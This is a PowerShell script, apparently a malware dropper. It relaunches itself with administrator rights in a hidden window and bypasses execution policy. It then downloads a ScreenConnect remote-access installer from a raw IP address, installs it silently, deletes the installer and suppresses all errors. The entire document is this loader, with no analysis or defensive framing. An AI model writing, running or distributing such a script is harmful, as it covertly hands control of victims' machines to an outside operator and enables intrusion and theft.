if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList $arguments
    exit
}

try {
    $url = "http://207.174.0.98/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"
    $output = "$env:TEMP\ScreenConnect.ClientSetup.exe"
    
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $output)
    $webClient.Dispose()
    
    if (Test-Path $output) {
        $process = Start-Process -FilePath $output -ArgumentList "/quiet /norestart" -Wait -PassThru -WindowStyle Hidden
        
        if ($process.ExitCode -ne 0) {
            $process = Start-Process -FilePath $output -ArgumentList "/S /silent /norestart" -Wait -PassThru -WindowStyle Hidden
        }
        

        Start-Sleep -Milliseconds 500
        Remove-Item $output -Force -ErrorAction SilentlyContinue
    }
} catch {
 
    exit 0
}


exit 0
